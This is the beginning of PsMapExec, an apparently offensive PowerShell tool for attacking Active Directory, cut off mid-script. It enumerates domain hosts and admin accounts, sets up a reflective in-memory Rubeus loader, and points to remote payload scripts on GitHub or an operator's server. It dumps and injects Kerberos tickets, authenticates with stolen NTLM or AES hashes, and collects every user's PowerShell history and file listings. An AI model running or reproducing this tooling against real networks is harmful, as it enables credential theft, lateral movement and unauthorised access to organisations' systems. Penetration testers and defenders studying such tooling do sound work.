Function PsMapExec{


[CmdletBinding()]
Param(
    [Parameter(Mandatory=$False, Position=0, ValueFromPipeline=$true)]
    [String]$Command = '',

    [Parameter(Mandatory=$False, Position=1, ValueFromPipeline=$true)]
    [String]$Targets = '',

    [Parameter(Mandatory=$False, Position=2, ValueFromPipeline=$true)]
    [String]$Domain = "$env:USERDNSDOMAIN",

    [Parameter(Mandatory=$False, Position=3, ValueFromPipeline=$true)]
    [String]$Username = "",

    [Parameter(Mandatory=$True, Position=4, ValueFromPipeline=$true)]
    [String]$Method = "",

    [Parameter(Mandatory=$False, Position=5, ValueFromPipeline=$true)]
    [String]$Module = "",

    [Parameter(Mandatory=$False, Position=6, ValueFromPipeline=$true)]
    [String]$Hash = "",

    [Parameter(Mandatory=$False, Position=7, ValueFromPipeline=$true)]
    [String]$Option = "",

    [Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$true)]
    [String]$Password = "",

    [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$true)]
    [String]$AllDomains = "",

    [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
    [String]$UserDomain = "",

    [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
    [String]$LocalFileServer = "",

    [Parameter(Mandatory=$False, Position=12, ValueFromPipeline=$true)]
    [String]$Threads = "8",

    [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
    [switch]$Force,

    [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
    [switch]$LocalAuth,
    
    [Parameter(Mandatory=$False, Position=15, ValueFromPipeline=$true)]
    [switch]$CurrentUser,

    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
    [switch]$SuccessOnly,

    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
    [switch]$ShowOutput,

    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
    [String]$Ticket = "",

    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
    [Switch]$AccountAsPassword,

    [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
    [Switch]$EmptyPassword
)

$startTime = Get-Date
Set-Variable MaximumHistoryCount 32767

################################################################################################################
###################################### Banner and version information ##########################################
################################################################################################################

$Banner = @("
  _____   _____ __  __          _____  ________   ________ _____ 
 |  __ \ / ____|  \/  |   /\   |  __ \|  ____\ \ / /  ____/ ____|
 | |__) | (___ | \  / |  /  \  | |__) | |__   \ V /| |__ | |     
 |  ___/ \___ \| |\/| | / /\ \ |  ___/|  __|   > < |  __|| |     
 | |     ____) | |  | |/ ____ \| |    | |____ / . \| |___| |____ 
 |_|    |_____/|_|  |_/_/    \_\_|    |______/_/ \_\______\_____|
                                                                 
")

Write-Output $Banner
Write-Host "Github  : "  -NoNewline
Write-Host "https://github.com/The-Viper-One"
Write-Host "Version : " -NoNewline
Write-Host "0.3.2"
Write-Host


################################################################################################################
####################################### Some logic based checking ##############################################
################################################################################################################

IF($Method -eq "MSSQL" -and $Command -ne "" -and $SourceDomain -ne ""){Write-Host "Cross Domain MSSQL command execution not currently supported" -ForegroundColor "Red" ; break}

if ($Threads -lt 2){
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be less than 2"
        return
}

if ($Method -eq ""  -and !$SessionHunter -and !$Spray){
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "No method specified"
        return
}




if ($Method -eq "RDP" -and $Hash -ne ""){
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Hash authentication not currently supported with RDP"
        return
}

if ($CurrentUser -and $Method -eq "RDP"){

        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "-Username and -Password parameters required when using the method RDP"
        return
}

elseif ($CurrentUser -and $Method -ne "RDP"){

        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Running in context of the current user:  $env:USERDNSDOMAIN\$env:USERNAME"
}


# Check script modules
$InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyContinue"

################################################################################################################
######################################### External Script variables ############################################
################################################################################################################

$PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
$KirbyURL =  "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"

# IF $LocalFileServer is not NULL, check if valid IP address 

if (![string]::IsNullOrEmpty($LocalFileServer)) {
    $ipRegex = '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'

    if ($LocalFileServer -match $ipRegex) {
        $PandemoniumURL = "http://$LocalFileServer/Invoke-Pandemonium.ps1"
        $KirbyURL = "http://$LocalFileServer/Kirby.ps1"
    }
    else {
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "The provided value '$LocalFileServer' is not a valid IP address."
        return
    }
}


################################################################################################################
########################################### Initial Directory Setup ############################################
################################################################################################################

$WorkingDirectory = (Get-Item -Path ".\").FullName

try {
    $testFilePath = Join-Path $WorkingDirectory "Test.PME"
    New-Item -ItemType "File" -Name "Test.PME" -Path $WorkingDirectory -Force -ErrorAction "Stop" | Out-Null
    Remove-Item -Path $testFilePath -Force | Out-Null
} catch {
    Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Current directory is not writable, change to a different directory and try again"
    return
}

$PME = Join-Path $WorkingDirectory "PME"
$SAM = Join-Path $PME "SAM"
$MSSQL = Join-Path $PME "MSSQL"
$LogonPasswords = Join-Path $PME "LogonPasswords"
$SMB = Join-Path $PME "SMB"
$Tickets = Join-Path $PME "Tickets"
$KerbDump = Join-Path $Tickets "KerbDump"
$MimiTickets = Join-Path $Tickets "MimiTickets"
$ekeys = Join-Path $PME "eKeys"
$LSA = Join-Path $PME "LSA"
$ConsoleHistory = Join-Path $PME "Console History"
$Sessions = Join-Path "$PME" "Sessions"
$UserFiles = Join-Path "$PME" "User Files"
$Spraying = Join-Path $PME "Spraying"

  if (-not (Test-Path $PME)) {
    New-Item -ItemType Directory -Force -Path $PME  | Out-Null
    Write-Host "[+] " -ForegroundColor "Green"  -NoNewline
    Write-Host "Created directory for PME at $PME"

} 
  if (-not (Test-Path $SAM)) {
    New-Item -ItemType Directory -Force -Path $SAM  | Out-Null
  }
  
  if (-not (Test-Path $LogonPasswords)) {
    New-Item -ItemType Directory -Force -Path $LogonPasswords  | Out-Null
  }
  
  if (-not (Test-Path $MSSQL)) {
    New-Item -ItemType Directory -Force -Path $MSSQL  | Out-Null
  }
   
   if (-not (Test-Path $SMB)) {
    New-Item -ItemType Directory -Force -Path $SMB | Out-Null
  }
   
   if (-not (Test-Path $Tickets)){
    New-Item -ItemType Directory -Force -Path $Tickets  | Out-Null
  }
  
  if (-not (Test-Path $ekeys)){
    New-Item -ItemType Directory -Force -Path $ekeys  | Out-Null
}

  if (-not (Test-Path $LSA)){
    New-Item -ItemType Directory -Force -Path $LSA  | Out-Null
}

  if (-not (Test-Path $KerbDump)){
    New-Item -ItemType Directory -Force -Path $KerbDump  | Out-Null
}

  if (-not (Test-Path $MimiTickets)){
    New-Item -ItemType Directory -Force -Path $MimiTickets  | Out-Null
}

  if (-not (Test-Path $ConsoleHistory)){
    New-Item -ItemType Directory -Force -Path $ConsoleHistory  | Out-Null
}

  if (-not (Test-Path $Sessions)){
    New-Item -ItemType Directory -Force -Path $Sessions | Out-Null
}

  if (-not (Test-Path $UserFiles)){
    New-Item -ItemType Directory -Force -Path $UserFiles | Out-Null

}

  if (-not (Test-Path $Spraying)){
    New-Item -ItemType Directory -Force -Path $Spraying | Out-Null
}



######### Checks if user context is administrative when a session is spawned #########
$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

################################################################################################################
########################################## Domain Target Acquisition ###########################################
################################################################################################################

$directoryEntry = [ADSI]"LDAP://$domain"
$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
$searcher.PageSize = 1000
$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))

if ($Targets -eq "Workstations") {

$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }

}
elseif ($Targets -eq "Servers") {

$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }

}
elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {

$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll()

}
elseif ($Targets -eq "All" -or $Targets -eq "Everything") {


$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }`

}

elseif ($Targets -is [string]) {
    $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
    if ($ipAddress) {
        Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
        break
    }
    else {
        $directoryEntry = [ADSI]"LDAP://$domain"
        $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*))"
        $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
        
        if ($Targets -notlike "*.*") {
            $Targets = $Targets + "." + $Domain
        }
        
        $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
    }
}


else {
    Write-Host "Invalid value for Targets. Must be Workstations, Servers, DC, All, an IP address or a system name." -ForegroundColor "Red"
    break
}
# Dispose the searcher after use
$searcher.Dispose()



################################################################################################################
############################ Grab interesting users for various parsing functions ##############################
################################################################################################################

function New-Searcher {
    $directoryEntry = [ADSI]"LDAP://$domain"
    $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
    $searcher.PageSize = 1000
    return $searcher
}

# Fetch enabled users
$searcher = New-Searcher
$searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
$searcher.PropertiesToLoad.AddRange(@("samAccountName"))

$users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
$EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }

# Fetch members of a group
function Get-GroupMembers {
    param (
        [Parameter(Mandatory = $true)]
        [string]$GroupName
    )

    $searcher = New-Searcher
    $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
    $searcher.PropertiesToLoad.AddRange(@("member"))
    $groups = $searcher.FindAll()

    $members = @()

    foreach ($group in $groups) {
        $group.Properties["member"] | ForEach-Object {
            $userDN = $_.ToString()
            $user = [ADSI]"LDAP://$userDN"
            $samAccountName = $user.Properties["samaccountname"] -as [array]
            if ($samAccountName) {
                $members += $samAccountName[0]
            }
        }
    }
    
    return $members
}

$DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
$EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
$ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
$AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue

# Grab Computer Accounts for spraying
function Get-ComputerAccounts {
    $searcher = New-Searcher
    $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
    
    try {
        $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
        return $ComputerSamAccounts
    } catch {
        Write-Error "Failed to fetch computer accounts. Error: $_"
        return $null
    }
}

$ComputerSamAccounts = Get-ComputerAccounts
$searcher.Dispose()


if (!$LocalAuth){
if ($Method -ne "RDP"){
if (!$Force){
foreach ($EnterpriseAdmin in $EnterpriseAdmins){
        $splitResult = $Username -split [regex]::Escape($EnterpriseAdmin)
        if ($splitResult.Count -gt 1) {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Specified user is a Enterprise Admin. Use the -Force switch to override"
        return
        }
    }
}

if (!$Force) {
    foreach ($DomainAdmin in $DomainAdmins) {
        $splitResult = $Username -split [regex]::Escape($DomainAdmin)
        if ($splitResult.Count -gt 1) {
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Specified user is a Domain Admin. Use the -Force switch to override"
            return
            }
        }
    }
}

if (!$CurrentUser) {
    if ($Method -ne "GenRelayList") {
        if ($Method -ne "SessionHunter"){
         if ($Method -ne "Spray"){
        try {
            $directoryEntry = [ADSI]"LDAP://$domain"
            $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
            $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
            $user = $searcher.FindOne()
            $domainUser = $user.Properties["samAccountName"]
        }
        Catch {
           
           if ($Ticket -ne $null){} 
            elseif (!$DomainUser) {
                Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Specified username is not a valid domain user"
                return
                
                        }
                    }
                }
            }
        }
    }
}



################################################################################################################
################################### Loads ticket functions into memory #########################################
################################################################################################################

if ($InvokeRubeusLoaded.Name -ne "Invoke-Rubeus"){
function Invoke-Rubeus{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String(""))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $vars = New-Object System.Collections.Generic.List[System.Object]

    foreach ($args in $Command.Split(" "))
    {
        $vars.Add($args)
    }

    $passed = [string[]]$vars.ToArray()

    $BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    $PrivateMethod = [Rubeus.Program].GetMethod('Main')

    if($PrivateMethod){
      $PrivateMethod.Invoke($Null,@(,$passed))
      }
    else{
      $PrivateMethod = [Rubeus.Program].GetMethod('Main')
      $PrivateMethod.Invoke($Null,@(,$passed))
      }
     [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
    }
}

################################################################################################################
##################################### Ticket logic for authentication ##########################################
################################################################################################################
# Set the userDomain when impersonating a user in one domain for access to an alternate domain
if ($UserDomain -ne ""){}


# Set the variable "CurrentUser" to $True if the switch -GenRelayList is used.
if (
    $Method -eq "GenRelayList" -or
    $Method -eq "SessionHunter" -or
    $Method -eq "Spray" -or
    $LocalAuth
) {
    $CurrentUser = $True
}

if ($Username -eq ""){
    $CurrentUser = $True
}

# Check if the current user is an administrator
$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# If CurrentUser is not set to $True, use Rubeus to store the current user's ticket
if (!$CurrentUser) {
    # If the method is not RDP
    if ($Method -ne "RDP") {
        try {
            $BaseTicket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
            $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
        }
        Catch {
            try {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Current user ticket retrieval failed. Trying alternate methods..."
                Start-Sleep -Seconds 2

                if (!$CheckAdmin) {
                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                    if ($OriginalUserTicket -notlike "doI*") {
                        Write-Host "[-] " -NoNewline -ForegroundColor "Red"
                        Write-Host "Unable to retrieve any Kerberos tickets"
                        return
                    }

                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "SUCCESS!"
                }
                elseif ($CheckAdmin) {
                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                    if ($OriginalUserTicket -notlike "doI*") {
                        Write-Host "[-] " -NoNewline
                        Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
                        return
                    }

                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "SUCCESS!"
                }
            }
            Catch {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Unable to retrieve any Kerberos tickets"
                return
            }
        }

        # Check if Password or Hash has been provided
         if ($Ticket -ne ""){ 
            if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
            $Ticket = Get-Content -Path $Ticket -Raw}


            $ProvidedTicket = Invoke-Rubeus -Command "describe /ticket:$Ticket"

            # Check if an error has occurred
            if ($ProvidedTicket -like "*/ticket:X*") {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Invalid ticket provided"
                return
            }

            # Use regular expression to extract the Username
            $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketRealm = [regex]::Match($ProvidedTicket, "UserRealm\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketExpiry = [regex]::Match($ProvidedTicket, "EndTime\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketType = [regex]::Match($ProvidedTicket, "ServiceName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value

            # Display the extracted information
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Supplied Ticket Details"
            
            if ($TicketType -like "krbtgt/*") { Write-Host "    - Type     : TGT" }
            if ($TicketType -notlike "krbtgt/*") { Write-Host "    - Type     : TGS" }
            
            Write-Host "    - UserName : $TicketUsername"
            Write-Host "    - Realm    : $TicketRealm"
            Write-Host "    - Expires  : $TicketExpiry"
            Write-Host
            
            # Attempt to inject the ticket into the current session
            $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket"
            if ($InjectTicket -like "*Error 1398*") {

                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-host "Ticket expired"
                    klist purge | Out-Null
                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
                        return
            }
    }
       elseif ($Password -ne "") {
            klist purge | Out-Null
            
            if ($UserDomain -ne ""){$AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"}
            elseif ($UserDomain -eq ""){$AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"}
            
        if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect password or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        if ($AskPassword -like "*Unhandled Rubeus exception:*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect password or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        }
       elseif ($Hash -ne "") {
        if ($Hash.Length -eq 32) {
        klist purge | Out-Null
        
        if ($UserDomain -ne ""){$AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"}
        if ($UserDomain -eq ""){$AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"}
        
        if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        if ($AskRC4 -like "*Unhandled Rubeus exception:*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }
    }
       elseif ($Hash.Length -eq 64) {
        klist purge | Out-Null

        if ($UserDomain -ne ""){$Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UseDomain /aes256:$Hash /opsec /force /ptt"}
        if ($UserDomain -eq ""){$Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"}

        if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        if ($Ask256 -like "*Unhandled Rubeus exception:*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }
    }
       else {
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
        Write-Host 
        Write-Host
        return

	        }
        }
    }
}

################################################################################################################
################################## Information based on selected module ########################################
################################################################################################################



if ($Module -eq "KerbDump"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Tickets will be written to $KerbDump"

    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to show results in the console"
        ""
    }
}

elseif ($Module -eq "Tickets"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Tickets will be written to $MimiTickets"

    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to show results in the console"
        ""
    }
}

elseif ($Module -eq "LSA"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "LSA output will be written to $LSA"
    #""
    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to show results in the console"
        ""
    }
}

elseif ($Module -eq "ekeys"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "eKeys output will be written to $ekeys"
    #""
    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to show results in the console"
        ""
    }
}

elseif ($Module -eq "SAM"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "SAM output will be written to $SAM"

    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to show results in the console"
        ""
    }
}

elseif ($Module -eq "LogonPasswords"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "LogonPasswords output will be written to $LogonPasswords"

    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to show results in the console"
        ""
    }
}

elseif ($Module -eq "ConsoleHistory"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Console History output will be written to $ConsoleHistory"

    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to show results in the console"
        ""
    }
}

elseif ($Module -eq "Files"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "File output will be written to $UserFiles"

    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to show results in the console"
        ""
    }
}

elseif ($Method -eq "SessionHunter"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Active sessions output will be written to $Sessions"
}

elseif ($Method -eq "GenRelayList"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "SMB Signing output will be written to $SMB"
}

################################################################################################################
######################################## Local scripts and modules #############################################
################################################################################################################

$ConsoleHostHistory = @'
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

foreach ($User in $Users) {
    $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
        $historyContent = Get-Content -Path $historyFilePath -Raw
        $historyLines = $historyContent -split "`n"
        Write-output ""
        Write-output "-----[$User]-----"
        $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
    }
}
'@

if ($Method -eq "WMI"){

$Files = @'
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")

foreach ($user in $users) {
    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
    $userHome = $user.FullName

    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue

    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }

    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0

    if ($hasFiles) {
        Write-Host ""
        Write-Host "----------------------------------------------------------------------------------------------"
        Write-Host ("[User] $user")

        if ($downloadsFiles.Count -gt 0) {
        ""
            Write-Host ("[Downloads]")
            $downloadsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($documentsFiles.Count -gt 0) {
        ""
            Write-Host ("[Documents]")
            $documentsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($desktopFiles.Count -gt 0) {
        ""
            Write-Host ("[Desktop]")
            $desktopFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($homeFiles.Count -gt 0) {
        ""
            Write-Host ("[Home]")
            $homeFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }
        Write-Host "----------------------------------------------------------------------------------------------"
    }
}
'@

}

if ($Method -ne "WMI"){
$Files = @'
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

